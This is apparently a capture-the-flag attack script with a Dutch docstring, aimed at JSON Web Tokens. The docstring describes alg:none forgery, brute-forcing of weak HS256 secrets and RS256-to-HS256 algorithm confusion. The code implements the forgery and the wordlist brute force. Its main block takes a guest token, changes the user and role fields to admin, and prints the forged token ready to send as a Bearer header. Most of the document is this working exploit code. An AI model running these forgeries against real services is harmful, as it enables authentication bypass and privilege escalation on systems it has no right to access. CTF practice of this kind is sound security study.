"""
JWT-AANVALLEN
=================
WANNEER GEBRUIKEN?
  - Je ziet een token van de vorm "header.payload.signature" (elk deel
    base64url-gecodeerd, gescheiden door punten).

AANPAK 1 -- alg: none (BEVESTIGD GEWERKT op "Token of Trust"):
  1. Log in / haal een geldig token op.
  2. Decodeer handmatig de eerste 2 delen (base64url).
  3. Pas header["alg"] aan naar "none", en verhoog je rechten in de payload.
  4. Her-encodeer beide delen, plak ze met een punt samen, LAAT het
     signature-deel LEEG (token eindigt op een punt).
  5. Stuur als "Authorization: Bearer <token>".

AANPAK 2 -- zwak/geraden HS256-secret: brute force met een wordlist.

AANPAK 3 -- algorithm confusion (RS256 -> HS256): als de server de
PUBLIEKE RSA-sleutel per ongeluk als HMAC-secret hergebruikt, kan je
zelf een geldige HS256-signature maken met die publieke sleutel als 'secret'.
"""
import base64
import json
import hashlib
import hmac


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(s: str) -> bytes:
    padding = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + padding)


def decode_jwt(token: str) -> tuple[dict, dict, str]:
    """Decodeert (zonder verificatie!) een JWT naar (header, payload, signature_b64)."""
    header_b64, payload_b64, sig_b64 = token.split(".")
    header = json.loads(b64url_decode(header_b64))
    payload = json.loads(b64url_decode(payload_b64))
    return header, payload, sig_b64


def forge_alg_none(new_payload: dict, header_extra: dict | None = None) -> str:
    """Bouwt een JWT met alg=none en een lege signature."""
    header = {"alg": "none", "typ": "JWT"}
    if header_extra:
        header.update(header_extra)
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(new_payload, separators=(",", ":")).encode())
    return f"{header_b64}.{payload_b64}."   # LET OP: eindigt op een punt!


def forge_hs256(new_payload: dict, secret: str, header_extra: dict | None = None) -> str:
    """Bouwt een geldig HS256-token met een (geraden/bekend) secret."""
    header = {"alg": "HS256", "typ": "JWT"}
    if header_extra:
        header.update(header_extra)
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(new_payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    sig_b64 = b64url_encode(sig)
    return f"{header_b64}.{payload_b64}.{sig_b64}"


def bruteforce_hs256_secret(token: str, wordlist_path: str = "rockyou.txt") -> str | None:
    """Probeert elk wachtwoord uit een wordlist als HS256-secret."""
    header_b64, payload_b64, sig_b64 = token.split(".")
    signing_input = f"{header_b64}.{payload_b64}".encode()
    target_sig = b64url_decode(sig_b64)

    with open(wordlist_path, encoding="utf-8", errors="ignore") as f:
        for line in f:
            secret = line.rstrip("\n")
            sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
            if sig == target_sig:
                return secret
    return None


if __name__ == "__main__":
    # TODO: vul het echte guest-token in dat je na login kreeg
    guest_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJ1c2VyIn0.xxxx"

    header, payload, _ = decode_jwt(guest_token)
    print("Header: ", header)
    print("Payload:", payload)

    # Aanpak 1: alg=none
    payload["user"] = "admin"
    payload["role"] = "admin"
    forged = forge_alg_none(payload)
    print("\nVervalst token (alg=none):")
    print(forged)
    print("Stuur dit als: Authorization: Bearer", forged)

    # Aanpak 2 (indien alg=none niet werkt):
    # found_secret = bruteforce_hs256_secret(guest_token, "rockyou.txt")
    # print("Gevonden secret:", found_secret)
    # if found_secret:
    #     new_token = forge_hs256({"user": "admin", "role": "admin"}, found_secret)
    #     print("Nieuw geldig token:", new_token)
